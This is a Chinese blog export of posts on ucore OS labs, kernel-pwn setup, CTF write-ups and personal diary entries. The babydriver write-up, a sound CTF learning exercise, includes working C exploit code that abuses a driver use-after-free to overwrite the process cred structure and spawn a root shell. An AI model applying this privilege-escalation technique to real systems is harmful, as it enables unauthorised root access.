设置地址范围描述符的大小为20字节,等于struct e820map的成员变量map的大小 movl $SMAP, %edx # 设置edx为534D4150h (即4个ASCII字符“SMAP”) int $0x15 # 调用int 0x15中断 jnc cont # 如果eflags的CF位为0，则表示还有内存段需要探测 movw $12345, 0x8000 # 结束探测 jmp finish_probecont: addw $20, %di # 设置下一个BIOS返回的映射地址描述符的起始地址 incl 0x8000 # 递增nr_map cmpl $0, %ebx # 如果INT0x15返回的ebx为零，表示探测结束，否则继续探测 jnz start_probe 在以上代码执行完毕之后，0x8000地址处即保存了从bios中获得的内存分布信息。并以对应结构体的格式填充。 以页为单位管理物理内存在获得可用物理内存范围后，系统需要建立相应的数据结构来管理以物理页（按4KB对齐，且大小为4KB的物理内存单元）为最小单位的整个物理内存，以配合后续涉及的分页管理机制。 每个物理页可以用一个page数据结构来表示。 123456struct Page &#123; int ref; // page frame&#x27;s reference counter uint32_t flags; // array of flags that describe the status of the page frame unsigned int property; // the num of free block, used in first fit pm manager list_entry_t page_link; // free list link&#125;;","categories":[{"name":"ucore","slug":"ucore","permalink":"https://fuurinko.github.io/categories/ucore/"}],"tags":[{"name":"os","slug":"os","permalink":"https://fuurinko.github.io/tags/os/"}]},{"title":"ucore lab1","slug":"ucore_lab1","date":"2022-07-16T10:01:36.685Z","updated":"2022-07-22T08:30:15.349Z","comments":true,"path":"2022/07/16/ucore_lab1/","link":"","permalink":"https://fuurinko.github.io/2022/07/16/ucore_lab1/","excerpt":"","text":"0：环境需要准备 能正常运行qemu的环境。 实验手册：https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_1_goals.html 实验代码：https://github.com/chyyuu/os_kernel_lab/tree/lab1_X 1: 实验目的分析加载操作系统的boot loader，并了解相关计算机原理。 2: 基础知识bios启动过程bios（(Basic Input Output System）作用为在计算机被加电之初，完成计算机io初始化，也就是读取硬盘主引导扇区到内存，并跳转到对应内存中执行bootloader。 大体过程是 硬件加电 -&gt; bios -&gt; bootloader -&gt;os bootloader 切换到保护模式，启用分段机制 读磁盘中ELF执行文件格式的ucore操作系统到内存 显示字符串信息 把控制权交给ucore操作系统 保护模式和分段机制实模式在bootloader接手BIOS的工作后，当前的PC系统处于实模式（16位模式）运行状态，操作系统和用户程序并没有区别对待，而且每一个指针都是指向实际的物理地址。用户程序的一个指针如果指向了操作系统区域或其他用户程序区域，并修改了内容，那么其后果就很可能是灾难性的。 保护模式隔离操作系统与用户空间，并且只有在保护模式下系统才可以使用分段以及分页储存管理机制。 分段存储该储存方式涉及了四个关键内容 逻辑地址（由段选择子selector和段偏移offset组成） 段描述符（描述段的属性） 段描述符表（包含多个段描述符的“数组”） 段选择子（段寄存器，用于定位段描述符表中表项的索引） 从逻辑地址到物理地址的转换： 获取逻辑地址中的段选择子以及偏移 -&gt; 以段选择子为索引，找到段描述符表中对应段描述符 -&gt; 将段描述符表中储存的段基址加上偏移，形成线性地址。（若不启动分页管理机制，则此线性地址为物理地址） 段描述符段基地址规定线性地址空间中段的起始地址。 段界限规定段大小 段属性确定段的各种属性。 全局描述符表保存多个段描述符的“数组”，其起始地址保存在GDTR（全局描述符表寄存器）中。 段选择子选择段描述符表，且选择该表中的描述符。 保护模式下的特权级ring0 （最高）- ring3（最低） ring3一般用于用户态。ring0用于内核态。 在任一时刻，x86 CPU都是在一个特定的特权级下运行的，从而决定了代码可以做什么，不可以做什么。 地址空间主要分为逻辑地址以及物理地址。逻辑地址指编程时使用的抽象虚拟地址，而物理地址空间则是一个“大数组”，CPU通过索引（物理地址）来访问这个“大数组”中的内容。物理地址是指CPU提交到内存总线上用于访问计算机内存和外设的最终地址。 中断操作系统中特殊的中断有三种： 由外部io设备引发的异步中断 cpu非正常执行引发的同步中断/内部中断，简称异常 例如系统调用一类的陷入中断，也称软中断。 当cpu收到中断或异常时，当前执行任务被暂停，并通过一定机制跳转到负责处理这个信号的相关处理例程中。这个机制主要由IDT（中断描述符表）负责。 中断描述符表中断描述符表把每个中断或异常编号和一个指向中断服务，是一个8字节的描述符数组。CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址，并将中断（异常）号乘以8做为IDT的索引。 中断初始化设置操作系统如果要正确处理各种不同的中断事件，就需要安排应该由哪个中断服务例程负责处理特定的中断事件。系统将所有的中断事件统一进行了编号（0～255），这个编号称为中断向量。以ucore为例，操作系统内核启动以后，会通过 idt_init 函数初始化 idt 表 (参见trap.c)，而其中 vectors 中存储了中断处理程序的入口地址。vectors 定义在 vector.S 文件中，通过一个工具程序 vector.c 生成。其中仅有 System call 中断的权限为用户权限 (DPL_USER)，即仅能够使用 int 0x30 指令。此外还有对 tickslock 的初始化，该锁用于处理时钟中断。 3: 练习练习一1：操作系统镜像文件ucore.img是如何一步一步生成的？ 这篇文章对于makefile的分析非常详细。 清华大学操作系统课程 ucore Lab 1 系统软件启动过程 实验报告 2： 一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？123456789//tools/sign.cbuf[510] = 0x55; buf[511] = 0xAA; FILE *ofp = fopen(argv[2], &quot;wb+&quot;); size = fwrite(buf, 1, 512, ofp); if (size != 512) &#123; fprintf(stderr, &quot;write &#x27;%s&#x27; error, size is %d.\\n&quot;, argv[2], size); return -1; &#125; 可以看出，首先扇区的大小为512字节，其次，最后两个字节为0x55AA。 练习二使用qemu执行并调试lab1中的软件 从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。 在初始化位置0x7c00设置实地址断点,测试断点正常。 从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。 自己找一个bootloader或内核中的代码位置，设置断点并进行测试。 将 tools/gdbinit修改为 12set architecture i8086target remote :1234 回到lab1目录下，执行make debug,此时画面如下： 可以看到在0xfff0处断下。此时执行的代码是kern/init/init.c。 设置gdbinit 1234set arch i8086target remote: 1234b *0x7c00continue 相当于下实地址断点。 练习3：分析bootloader进入保护模式的过程。 为何开启A20，以及如何开启A20 如何初始化GDT表 如何使能和进入保护模式 参考https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_appendix_a20.html 为何开启A20早期8086提供20根地址线，而数据处理宽度最大为16位，因此使用段寄存器值 &lt;&lt; 4 + 段内偏移值的方式来访问地址，但这种方式计算出的地址最大值超过来20位地址线能够表示的范围，因此会发生“回卷”。而80386使用24根地址总线，因此就算使用相同的寻址方式也不会发生回卷，然而这就造成了向下不兼容的问题，为了解决这个问题，IBM决定在计算机系统上加入一个硬件逻辑，来模仿回卷。这个硬件逻辑就是A20 GATE。 A20 gate将键盘控制器输出与A20地址线进行and操作，从而控制A20地址线的打开和关闭。 最初A20总是关闭状态，直到系统软件通过一定的io操作打开。（bootasm.S） 当A20地址线关闭时，1MB以上的地址不可访问。 如何开启A20首先需要向键盘控制器8042发送一个命令，接着键盘控制器会讲它的某个输出引脚的输出置为高电平，作为A20地址线控制输入。 键盘控制器8042早期由单片机芯片实现，具体结构如下图： io端口为 0x60～0x6f。实际使用的只有0x60和0x64两个端口。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用户控制A20信号线的开启与否。 （插一句，这个东西好像我们那奇怪的pic课内容） 其实就是通过改变状态寄存器，设置不同的状态，从而进行io操作， 而打开A20 Gate的具体步骤如下： 等待8042 Input buffer为空； 发送Write 8042 Output Port （P2）命令到8042 Input buffer； 等待8042 Input buffer为空； 将8042 Output Port（P2）得到字节的第2位置1，然后写入8042 Input buffer； 对应在bootasm.S中的内容。 如何初始化GDT表12345678910# Bootstrap GDT.p2align 2 # force 4 byte alignmentgdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernelgdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt 首先设置第一项描述符为null。 第二行设置描述符为代码段，属性rwx。 第三行设置描述符为数据段，属性rw。 如何使能和进入保护模式1234567891011121314.set CR0_PE_ON, 0x1 # protected mode enable flag# Switch from real to protected mode, using a bootstrap GDT# and segment translation that makes virtual addresses# identical to physical addresses, so that the# effective memory map does not change during the switch.lgdt gdtdescmovl %cr0, %eaxorl $CR0_PE_ON, %eaxmovl %eax# Jump to next instruction, but in 32-bit code segment.# Switches processor into 32-bit mode.ljmp $PROT_MODE_CSEG, $protcseg 从代码可以看出，进入保护模式需要设置cr0寄存器为0x1，也就是CR0_PE_ON的值，接着 执行指令ljmp $PROT_MODE_CSEG, $protcseg 练习四：分析bootloader加载ELF格式的OS的过程阅读bootmain.c，了解bootloader如何加载ELF文件。通过分析源代码和通过qemu来运行并调试bootloader&amp;OS。 bootloader如何读取硬盘扇区的？ 查表。 可以看到程序中对应的代码段： 123456789101112static voidreadsect(void *dst, uint32_t secno) &#123; waitdisk();//等待磁盘准备 outb(0x1F2, 1); //根据表可以看出，读取一个扇区。 outb(0x1F3, secno &amp; 0xFF); //分别设置lba参数的0-27位 outb(0x1F4, (secno &gt;&gt; 8) &amp; 0xFF); outb(0x1F5, (secno &gt;&gt; 16) &amp; 0xFF); outb(0x1F6, ((secno &gt;&gt; 24) &amp; 0xF) | 0xE0); outb(0x1F7, 0x20); // 设置为读取 waitdisk();//等待磁盘准备 insl(0x1F0, dst, SECTSIZE / 4);//从0x1f0端口读取数据&#125; bootloader是如何加载ELF格式的OS？ 12345678910111213141516voidbootmain(void) &#123; readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0);//从磁盘中读取第一页数据 if (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123; goto bad; &#125;//判断是否为有效elf struct proghdr *ph, *eph; // 加载每个程度的段 ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-&gt;e_phoff); eph = ph + ELFHDR-&gt;e_phnum; for (; ph &lt; eph; ph ++) &#123; readseg(ph-&gt;p_va &amp; 0xFFFFFF, ph-&gt;p_memsz, ph-&gt;p_offset); &#125; //跳转到程序入口点 ((void (*)(void))(ELFHDR-&gt;e_entry &amp; 0xFFFFFF))();&#125; 练习五：实现函数调用堆栈跟踪函数通过函数print_stackframe来跟踪函数调用堆栈中记录的返回地址。 （四舍五入相当于一个dbg系统） 从0 - 栈长，分别打印ebp，rip以及对应的代码信息。 读取ebp和eip的函数已经给出，并且对应的数据类型都已经设置好。 12345678910111213141516171819202122232425262728293031voidprint_stackframe(void) &#123; /* LAB1 YOUR CODE : STEP 1 */ /* (1) call read_ebp() to get the value of ebp. the type is (uint32_t); * (2) call read_eip() to get the value of eip. the type is (uint32_t); * (3) from 0 .. STACKFRAME_DEPTH * (3.1) printf value of ebp, eip * (3.2) (uint32_t)calling arguments [0..4] = the contents in address (unit32_t)ebp +2 [0..4] * (3.3) cprintf(&quot;\\n&quot;); * (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc. * (3.5) popup a calling stackframe * NOTICE: the calling funciton&#x27;s return addr eip = ss:[ebp+4] * the calling funciton&#x27;s ebp = ss:[ebp] */ uint32_t ebp = read_ebp(); //(1) call read_ebp() to get the value of ebp. the type is (uint32_t); uint32_t eip = read_eip(); //(2) call read_eip() to get the value of eip. the type is (uint32_t); for (int i = 0; i &lt; STACKFRAME_DEPTH; ++i) &#123; cprintf(&quot;ebp : 0x%x&quot;,ebp); cprintf(&quot;eip : 0x%x&quot;,eip);//分别打印eip和ebp的值 uint32_t* args = (uint32_t*)ebp + 2; //接着打印对应的参数 for (int uint32_t j = 0; j &lt; 4; ++j) &#123; cprintf(&quot;args: 0x%x\\n&quot;,args[j]); &#125; print_debuginfo(eip-1);//这里就是打印类似kern/debug/kdebug.c:306: print_stackframe+37的信息 eip = *((uintptr_t*)ebp + 1);//设置新的eip为ebp+1处的地址 ebp = *(uintptr_t*)ebp;//设置新的ebp &#125;&#125; 练习6：完善中断初始化和处理中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？在mm/mmu.h中可以看到 123456789101112/* Gate descriptors for interrupts and traps */struct gatedesc &#123; unsigned gd_off_15_0 : 16; // low 16 bits of offset in segment unsigned gd_ss : 16; // segment selector unsigned gd_args : 5; // # args, 0 for interrupt/trap gates unsigned gd_rsv1 : 3; // reserved(should be zero I guess) unsigned gd_type : 4; // type(STS_&#123;TG,IG32,TG32&#125;) unsigned gd_s : 1; // must be 0 (system) unsigned gd_dpl : 2; // descriptor(meaning new) privilege level unsigned gd_p : 1; // Present unsigned gd_off_31_16 : 16; // high bits of offset in segment&#125;; 一个gatedesc的大小8 byte。 gd_off_15_0和gd_off_31_16指定了段偏移，gd_ss制定了段基址，这三个成员共同确定了中断处理程序的地址，作为中断处理代码的入口。 请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。setgate函数： 123456789101112131415161718192021// kern/mm/mmu.h/* * * Set up a normal interrupt/trap gate descriptor * - istrap: 1 for a trap (= exception) gate, 0 for an interrupt gate * - sel: Code segment selector for interrupt/trap handler * - off: Offset in code segment for interrupt/trap handler * - dpl: Descriptor Privilege Level - the privilege level required * for software to invoke this interrupt/trap gate explicitly * using an int instruction. * */#define SETGATE(gate, istrap, sel, off, dpl) &#123; \\ (gate).gd_off_15_0 = (uint32_t)(off) &amp; 0xffff; \\ (gate).gd_ss = (sel); \\ (gate).gd_args = 0; \\ (gate).gd_rsv1 = 0; \\ (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32; \\ (gate).gd_s = 0; \\ (gate).gd_dpl = (dpl); \\ (gate).gd_p = 1; \\ (gate).gd_off_31_16 = (uint32_t)(off) &gt;&gt; 16; \\ 1234567891011121314151617181920voididt_init(void) &#123; extern uintptr_t __vectors[]; int i; //step 1 for(i = 0; i &lt; 257; i++) &#123; SETGATE(idt[i],0,GD_KTEXT, __vectors[i], DPL_KERNEL); //第一项为对应gate，第二项“1”为trap gate，“0”为interrupt gate //第三项为段选择子，选择interrupt或trap handler //第四项为段偏移，此处为中断处理程序的入口地址，存放于__vectors[]。 //第五项为特权级描述符，表明唤醒中断/trap gate的软件的特权级。 &#125; //step 2 SETGATE(idt[T_SWITCH_TOK], 0, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER); //将从用户态转为内核态的中断特权级设置为user //step3 lidt(&amp;idt_pd);//加载idt表到cpu&#125;","categories":[{"name":"ucore","slug":"ucore","permalink":"https://fuurinko.github.io/categories/ucore/"}],"tags":[{"name":"os","slug":"os","permalink":"https://fuurinko.github.io/tags/os/"}]},{"title":"七月","slug":"vivi_2022年七月","date":"2022-07-16T08:36:24.556Z","updated":"2022-10-24T12:49:31.745Z","comments":true,"path":"2022/07/16/vivi_2022年七月/","link":"","permalink":"https://fuurinko.github.io/2022/07/16/vivi_2022%E5%B9%B4%E4%B8%83%E6%9C%88/","excerpt":"","text":"​ 不想学英语，不想学英语，不想学英语。 ​ 简单列一下这个暑假的计划。 ​ 看了一些群友的博客，感触颇多。 二进制 kernel pwn相关的知识点。至少到能做一点简单的题的程度。 简单的cve复现。 熟悉fuzz。 随缘做一点天问之路的task。 偶尔做一点高版本glibc题。 做一点pwncollege玩一玩。 其他 看完我列的书。目前在看谈美，不过争取这个暑假把红书和叔本华看完先。 每天还是听一听英语吧。 不要再熬夜看小说了姐姐，男童文学毫无营养啊。 碎碎念 最近每天会花半个多小时做饮料喝，比如什么茉莉芒果西瓜桃子冰，今天还做了抹茶拿铁，不过想突破一下，做一点好看（但不一定好喝）的鸡尾酒。初衷其实是为了省钱，做这些虽然能感受到时间的流逝，不过还是很开心。 每天坚持写一点东西其实挺好的，但是知识摄入太少了，所以根本写不出来什么有价值的东西，只有自己的生活以及感想，wp什么的就根本不算，还是得多看书。","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"}]},{"title":"vmware fusion无法复制粘贴问题","slug":"mess_vmware fusion无法复制粘贴问题","date":"2022-07-15T14:28:51.623Z","updated":"2022-07-16T08:49:52.387Z","comments":true,"path":"2022/07/15/mess_vmware fusion无法复制粘贴问题/","link":"","permalink":"https://fuurinko.github.io/2022/07/15/mess_vmware%20fusion%E6%97%A0%E6%B3%95%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98/","excerpt":"","text":"Ubuntu20.04安装vmware tools时显示segment fault，虽然最后显示成功安装，但是没有任何效果，依旧不能复制粘贴。 解决方式： 首先删除已经安装的vmware tools。具体方法是 12cd vmware-tools-distrib/binsudo ./vmware-uninstall-tools.pl 接着直接 1sudo apt-get install open-vm-tools open-vm-tools-desktop 安装以后尝试一下能不能复制，不能的话尝试重启，反正我重启以后就好了。 之前搜索方式有问题，关键词是无法复制，换了一个段错误的关键词就行了。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[]},{"title":"kernel环境+基础知识","slug":"kernel_环境搭建及基础知识","date":"2022-07-14T14:09:06.354Z","updated":"2022-07-16T08:02:10.540Z","comments":true,"path":"2022/07/14/kernel_环境搭建及基础知识/","link":"","permalink":"https://fuurinko.github.io/2022/07/14/kernel_%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"环境搭建一般来说教程都会要求我们编译一个内核，安装一个busybox以及qemu，但是实际做题需要的环境只有qemu，因为题目会提供一个内核镜像，而busybox也不是必须，但是在这里还是都搭建一下。 qemu一般来说elf的话只需要用包管理器下载：sudo apt install qemu-system 有特殊需求可以用源码编译。但是暂时就省去这一步了。 （ps：这里有一个坑，对于macos + pd的组合，你的pd版本如果是普通的家庭版，将不会支持嵌套虚拟化，也就是四舍五入qemu运行不了，要么换vmware要么花钱升级。我这里选择的是vmware，但是vmware最好也要12.2以上（还是针对intel的情况，m系不清楚），不然会出现各种奇怪的问题） kernel12345curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.9.8.tar.xzunxz linux-5.9.8.tar.xztar -xf linux-5.9.8.tarcd linux-5.9.8make menuconfig 这一步弹出一个图形化窗口，选择 Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info Kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger 接着make -j3 bzImage 基本没有过多的报错，反正我没有遇到。 busybox还是下载源码编译。 ubuntu 20.04 编译只有一个报错，产生的原因是没有安装glibc-static依赖。可以直接用包管理器安装，然后直接编译。 12wget https://busybox.net/downloads/busybox-1.34.1.tar.bz2tar -jxf busybox-1.34.1.tar.bz2 勾选Setttings -&gt; Build static binary (no shared libs), 123cd busybox-1.34.1make menuconfigmake -j 8 安装到这里就差不多了，后面的步骤比较抽象，这里就直接用题目来举例。 基础知识例题还是CISCN2017_babydriver，可以在ctf wiki上对应章节找到原题。 题目给了我们三个文件，一般来说内核题都会提供这样的三种文件。 总体来说，boot.sh是一个启动内核的脚本，大致是利用qemu启动，然后规定了启动的一些参数。bzImage则是内核本身，rootfs.cpio是运行qemu需要的一些文件系统。我们分别详细地看一看。 boot.sh当环境准备完善以后，直接执行shell脚本就能够启动题目所给的内核镜像。启动成功的话效果大致如下： 可以看到整个脚本主要是指定了八个参数。 123456789qemu-system-x86_64 -initrd_rootfs.cpio -kernel bzImage -append &#x27;console = ttyS0 root = /dev/ram oops = panic panic = 1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep 这里分别解释一下。 ignited设置内核启动的内存文件系统，也就是指定我们的rootfs.cpio 文件。 kernel指定内核镜像文件的路径 append附加选项。console=ttyS0意为在当前终端启动虚拟机。oops = panic panic = 1大致是指设置一下当进程崩的时候的状况root = /dev/ram不清楚具体功能。 -enable-kvm启用KVM？ -monitor-m设置内存大小 -smp配置客户机的smp系统。例如设置每个cpu socket上的core数量以及将core上的线程数。 -cpu设置cpu模型。这里的+smep意为禁止cpu处于ring0时执行用户空间代码。 bzimage​ 一种主流kernel镜像模式，意为big kernel。 roots.cpio​ 可以先file一下。cpio是一种用来备份的格式，直接用对应命令解压： 1cpio -idmv &lt; rootfs.cpio ​ 解压后则是我们运行内核需要的文件系统。 ​ 看看init有什么吧。 ​ 可以看到init也是一个shell脚本。 ​ 前三行的 mount用于挂载文件系统，例如mount -t proc none /proc相当于当我们访问/proc文件夹，就意味着我们正在访问proc分区。 ​ 接着将flag设置为仅root可读，也就是只要我们是root权限那么就能拿到flag。 ​ 其他的步骤比较常规，这里重点关注insmod这一条指令。这条指令的作用是插入模块，依赖的是linux的LKM，即动态可加载内核模块功能，在运行时插入或拔出模块。 ​ 这里就是插入 babydriver.ko 这个模块。 ​ 其他的指令暂时不关注。 ​ 这道题的漏洞就出在这个驱动上，在分析这个漏洞驱动前，先来了解一下关于驱动的知识。 ​ 简单将驱动理解为基于内核的应用程序不可取，但是实际上这两者是有相同点的。 ​ 一个从wiki上copy的驱动代码如下： 123456789101112131415#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);static int ko_test_init(void) &#123; printk(&quot;This is a test ko!\\n&quot;); return 0;&#125;static void ko_test_exit(void) &#123; printk(&quot;Bye Bye~\\n&quot;);&#125;module_init(ko_test_init);module_exit(ko_test_exit); ​ 将这个驱动编译，需要如下Makefile： 123456789obj-m += ko_test.oKDIR =/home/iromise/dev/kernel/linux-5.4.98/all: $(MAKE) -C $(KDIR) M=$(PWD) modulesclean: rm -rf *.o *.ko *.mod.* *.symvers *.order ​ 可以看到整个驱动似乎只实现了两件事，一问好二道别。从这一点上看和一个普通的应用程序也没有太大的差异，都是利用c语言实现一些看起来很简单的功能，但是实际上两者有本质的区别。 ​ 驱动类似硬件以及软件之间沟通的桥梁，驱动代码看起来并不完全是嵌入式编程那样完全操纵硬件，但也在很大程度上通过一些封装的方式来控制硬件。 ​ 换句话来说，驱动是介于硬件以及操作系统两个层级间的媒介，虽然功能看起来并不是那么的“硬”，但是也是直接针对于硬件进行管理。 ​ 例如printf和printk，前者是我们常见的标准输出函数，后者是内核驱动编程中常见的函数，也就是向内核日志打印信息。打印的过程和原理与printf类似。 ​ 大致讲了一下驱动是什么，回到题目。 ​ 这道题加载的驱动是babydrive.ko,我们接下来着重分析这个模块。 驱动伪代码分析首先查一下保护。可以看到题目用的kernel版本是4.4.72。 ​ 64位，只开启了NX保护。拖进ida里。 需要分析的函数大致是这么几个： ​ 可以看到一组是初始化以及清理。另一组是io相关的函数。 首先看初始化。 init_module第一步 1alloc_chrdev_region(&amp;babydev_no, 0LL, 1LL, &quot;babydev&quot;) 这个函数的目的则是申请一个名为babydev的新设备，并将设备号储存在babydev_no。 1cdev_init(&amp;cdev_0, &amp;fops); 初始化一个cdev结构体，并设置该设备的各种操作为传入的*fop，即file_operations。 这个结构体包含了很多函数指针，例如read，write等。 1cdev_add(&amp;cdev, (unsigned int)babydev_no, 1LL); 接着。将之前申请的设备号传入结构体。 1_class_create(&amp;_this_module, &quot;babydev&quot;, &amp;babydev_no); 创建类，存放于/sys/class 1device_create(v2, 0LL, (unsigned int)babydev_no, 0LL, &quot;babydev&quot;); 总体就是将设备号所对应的设备注册进 sysfs。 cleanup_module1234device_destroy(babydev_class, (unsigned int)babydev_no); class_destroy(babydev_class); cdev_del(&amp;cdev); return unregister_chrdev_region((unsigned int)babydev_no, 1LL); 将init创建的一些结构，类之类的全部释放。 babyopen12345_fentry__(); babydev_struct = kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL); qword_D98 = 64LL; printk(&quot;device open\\n&quot;); return 0LL; 创建一个babydev_struct结构体，长度为64。 babyrelease相当于free，并且对结构体free后没有将指针置0/ babyread&amp;wirte比较普通，没有什么特别值得关注的。 babyioctl相当于realloc。但是此时重新分配的结构体的大小可以由用户指定。 漏洞这个题的漏洞比较多，首先最重要的就是babystruct是一个全局变量，这意味着多个设备可以共用一个结构体，所以当一个设备释放了该结构体，另一个设备可以对其任意写造成UAF。 此外本身free结构体就存在uaf，而且ioctl处也存在问题。 利用一般来说我们希望对目标提权，取得root权限以读取flag。而cred结构体正好就记录了当前进程的权限，所以如果我们能够修改cred结构体，将进程的uid等设置为0，就能够进行提权。 而修改cred的典型方法如下（copy from ctf‘ wiki） 申请一块与 cred 结构体大小一样的堆块 释放该堆块 fork 出新进程，恰好使用刚刚释放的堆块 此时，修改 cred 结构体特定内存，从而提权 这个题就可以用这个方法，该内核版本下cred的大小是0xa8，所以我们只需要申请一个0xa8大小的device buf，并释放，再fork新进程，此时新进程的cred结构体就会用到我们刚才释放的内存空间，于是就可以利用uaf对其进行覆写。 exp123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main()&#123; int device1 = open(&quot;/dev/babydev&quot;, 2); int device2 = open(&quot;/dev/babydev&quot;, 2); ioctl(device1, 0x10001, 0xa8); close(device1); int new_process_pid = fork(); if (new_process_pid &lt; 0) &#123; puts(&quot;[*] fork error&quot;); exit(0); &#125; else if (new_process_pid == 0) &#123; char lots_zero[30] = &#123;0&#125;; write(device2, lots_zero, 28); if (getuid() == 0) &#123; puts(&quot;[*] got root&quot;); system(&quot;/bin/sh&quot;); exit(0); &#125; &#125; else &#123; wait(NULL); &#125; close(device2); return 0;&#125; 好阴间，我还没有调好这个虚拟机的复制粘贴。目前就这样吧。 参考https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-babydriver-init https://cjovi.icu/pwnreview/1408.html https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/","categories":[{"name":"KERNEL","slug":"KERNEL","permalink":"https://fuurinko.github.io/categories/KERNEL/"}],"tags":[{"name":"KERNEL","slug":"KERNEL","permalink":"https://fuurinko.github.io/tags/KERNEL/"}]},{"title":"pwn1（已弃）","slug":"ciscn_2022_pwn1","date":"2022-07-08T05:47:13.868Z","updated":"2022-07-15T07:47:35.059Z","comments":true,"path":"2022/07/08/ciscn_2022_pwn1/","link":"","permalink":"https://fuurinko.github.io/2022/07/08/ciscn_2022_pwn1/","excerpt":"","text":"一个简单的复建，题目是今年西南赛区pwn1，是一个很常规的栈的rop，套了orw。 逆向​ 这个题的逆向不算复杂，同样也是操作符控制指令的形式，输多少个操作符就执行多少次指令，具体的过程就不写了。 ​ 操作符对应的指令如下： 123456789#1 --&gt; &gt; [++buf_idx]#2 --&gt; &lt; [--buf_idx] #3 --&gt; + [++buf[buf_idx]]#4 --&gt; - [--buf[buf_idx]]#5 --&gt; . [write(1, &amp;buf[buf_idx], 1uLL)]#6 --&gt; , [getchar]#7 --&gt; [ [idx = word_4042[2 * idx];]#8 --&gt; ] [idx = word_4042[2 * idx];] ​ 因为题目给我们提供了写和读的操作，并且还能够控制idx，那么很显然这又是一道越界读写。 ​ 由于有沙箱，所以直接考虑rop+orw，这一段不算太复杂，只需要找对地址套板子。 利用​ 大体的思路就是利用越界读leak，再用越界写将返回地址改为rop链。看起来非常简单，但是还是有很多细节需要注意。由于是栈上orw，首先读入flag的地址需要被leak，这就要求我们leak libc和stack。 ​ 首先leak libc。 ​ buf是一个栈上的数组。 ​ 这里则打印对应栈上的数据，每次只读1个字节。 ​ 呜呜，现在我的旁边有一只猫猫，猫猫在看我打字。 ​ 不是很想做了，就这样吧，真的不喜欢这种无聊栈题。 ​","categories":[{"name":"STACK - ROP","slug":"STACK-ROP","permalink":"https://fuurinko.github.io/categories/STACK-ROP/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"六月","slug":"vivi_2022年六月","date":"2022-07-07T07:27:40.124Z","updated":"2022-10-24T12:35:30.524Z","comments":true,"path":"2022/07/07/vivi_2022年六月/","link":"","permalink":"https://fuurinko.github.io/2022/07/07/vivi_2022%E5%B9%B4%E5%85%AD%E6%9C%88/","excerpt":"","text":"​ 今日小暑。 ​ 久违地重新开始写博客了，之前由于期末周，一直没有来得及整理。昨天把所有试全部考完了，国赛西南分赛区半决赛也打完了，师傅们非常强。 ​ 之所以写下这些，实在是因为脑子里空空的，心里也空空的，不知该干什么，心情理应舒畅，然而现在却是一滩死水。我不知道该干什么了，只有一团乱麻似的思绪在胸口发闷。 ​ 我开始萌生一些悔意了。大约三个月前，我的想法和现在从结果上来说有一些相似，大致是：“人生没有意义”。但是推演出结论的过程却截然不同，三个月前的我站在谷底向着仰望着永远无法触及的地平线悲鸣，三个月后我坐在28度空调房里，腿裹着被子，抿着冰镇的茉莉绿茶，思考人生与死的关系，从这个角度看，我是不是进步了。（笑 ​ “人终有一死”这句话有无数种解答方式。“不以物喜，不以己悲”——这是我的答案。 ​ 实际上对于“人生意义何在”与“人终有一死”的解答存在着微妙的偏差，或者说后者通常用于对前者作补充说明。 ​ 当今文艺作品热衷于以批判性思维审视社会风潮，提倡我们回归本心，遵循自身。中午吃饭的时候张麻子给我看了一部半个钟头的小电影，讲的是一个高三学生为了追求分数，差点走火入魔放弃自己爱好与梦想的故事，可以看出导演想要表达的就是“高考并不是人生的全部”。说来也好笑，人生并不是只有一次高考，我一直认为任何需要花费时间与精力进行的选拔性考验，都可以称之为高考。不过这就有些跑题了，显然这个电影想告诉我们，人生的美好也来源于对美好事物的追求。 ​ 